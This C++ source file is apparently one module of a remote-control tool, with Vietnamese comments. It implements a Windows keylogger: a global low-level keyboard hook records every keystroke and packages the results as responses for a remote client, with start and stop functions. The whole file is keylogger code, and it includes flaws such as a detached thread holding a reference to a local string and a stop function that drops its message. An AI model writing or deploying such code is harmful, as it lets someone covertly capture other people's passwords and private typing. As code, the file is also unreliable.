#include "KLG_Func.h"
#include "utils.h"
#include "DataObj/DataObj.h"

bool KLG_Func::keylogging = false;
HHOOK KLG_Func::hook = NULL;
std::vector<int> keylog;

LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0) { // Bỏ qua các thông điệp khác nếu nCode < 0
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}
	

	if (wParam == WM_KEYDOWN)
	{
		// Lấy thông tin về sự kiện phím
		KBDLLHOOKSTRUCT* pkbhs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

		// Nếu là sự kiện nhấn phím, lưu phím vào biến tạm
		keylog.push_back(pkbhs->vkCode);
	}

	// Gọi hàm xử lý sự kiện tiếp theo trong chuỗi xử lý
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
/*
std::shared_ptr<DataObj> KLG_Func::keylogger()
{
    std::string res = "";
	std::shared_ptr<DataObj> MES(new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res));

	// Thiết lập hook để bắt sự kiện phím
	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	// Nếu không thiết lập hook thành công, báo lỗi và thoát chương trình
	if (!hook)
	{
		std::cout << "Error setting keyboard hook: " << GetLastError() << std::endl;
		
		// Đóng socket và giải phóng thư viện Winsock
		// ...
        
		res = "Hook failed.";
	}
    else
    {
        while (!checkStopSignal())
        {
            // Nếu đã bắt được ít nhất một phím, gửi danh sách các phím đã bắt được đến client
            if (!keylog.empty())
            {
                // Ghép các phím đã bắt được thành một chuỗi
                for (auto key : keylog)
                {
                    res += (char(key));
                }

                // Xóa danh sách các phím đã bắt được
                keylog.clear();
            }

            // Chờ 1 giây trước khi kiểm tra lại
            Sleep(1000);
        }

        // Huỷ hook
        UnhookWindowsHookEx(hook);
    }

    MES->setData(res);
	
	return MES;
}
*/
void KLG_Func::KeylogThreadFunc(std::string& res)
{
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	for (int key : keylog)
	{
		res += std::to_string(key);
	}

	keylog.clear();
	
}

std::shared_ptr<DataObj> KLG_Func::startKeylog()
{
	std::string res = "";
	std::shared_ptr<DataObj> MES(new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res));
	if (!keylogging)
	{
		HINSTANCE hInstance = GetModuleHandle(NULL);

		// Thiết lập hook để bắt sự kiện phím
		hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
		// Nếu không thiết lập hook thành công, báo lỗi và thoát chương trình
		if (!hook)
		{
			std::cout << "Error setting keyboard hook: " << GetLastError() << std::endl;

			// Đóng socket và giải phóng thư viện Winsock
			// ...

			res = "Hook failed.";
		}
		else
		{
			keylogging = true;
			std::thread keylogThread(KeylogThreadFunc, std::ref(res));
			keylogThread.detach();
		}
	}
	else res = "Keylogging is already running";
	MES->setData(res);
	return MES;
}

std::shared_ptr<DataObj> KLG_Func::stopKeylog()
{
	std::string res = "";
	std::shared_ptr<DataObj> MES(new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res));

	if (keylogging)
	{
		UnhookWindowsHookEx(hook);
		keylogging = false;
		res = "Keylogging stopped";
	}
	else res = "Keylogging is not running";
	return MES;
}


